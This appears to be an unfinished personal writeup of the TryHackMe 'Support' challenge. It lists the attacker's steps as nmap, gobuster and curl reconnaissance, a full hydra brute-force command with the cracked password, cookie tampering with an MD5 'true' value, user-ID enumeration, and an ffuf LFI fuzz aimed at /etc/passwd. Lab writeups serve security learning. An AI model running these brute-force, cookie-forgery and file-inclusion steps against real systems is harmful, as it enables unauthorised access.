---
title: THM Challenge "Support" Writeup
tags:
  - Tryhackme
  - TryhackmeWalkthrough
  - writeups
image: /assets/images/62a7685ca6e7ce005d3f3afe-1773827665267.png
---
This walkthrough I did is on the path "Junior Penetration Tester", "" module. 

The given question for this challenge is

> A new internal Support Operations Platform has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.
>
> Can you pentest the platform and escalate your access to achieve RCE on the server?

The first thing I did is port scanning using nmap

```
nmap -sV <ip>
```

I found out that port 80 (http) and 22(ssh) are active.

gobuster dir -u [http://10.48.176.126/](http://10.48.176.126/) -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50

curl -i -X OPTIONS [http://10.48.176.126/](http://10.48.176.126/)

info.php, /includes, /skins/default.php, 

curl -si [http://10.49.187.109/](http://10.48.176.126/) -d "email=[help@support.thm](mailto:help@support.thm)&password=wrongpass" | head -30

This worked:

```
hydra -l help@support.thm -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt 10.49.187.109 http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 10 -w 1 -f -V -o found.txt
```

![image.png](/assets/images/image-4.png)

I found it!! The password for [help@support.thm](mailto:help@support.thm) is "snoopy". So freaking exciting, and cookie value "isITuser" is MD5 hashed value of "false" for [help@support.thm](mailto:help@support.thm), so I will use MD5 hashed value for "true" and replace that in "isITuser" value. "b326b5062b2f0e69046810717534cb09", and I thought I would get admin  it went to /api.php

![image.png](/assets/images/image-1.png)

There I can go to /user/3

![image.png](/assets/images/image-2.png)

Then I know that it is not admin account, so I will go to /user/1

![image.png](/assets/images/image-3.png)

I will try with hydra again for login

ffuf -u "[http://10.48.170.191/?skin=FUZZ](http://10.48.170.191/?skin=FUZZ)" \

  -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \

  -mr "root:x:0:0" -t 50 -o lfi_hits.json

This Github Repo is Good:  [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)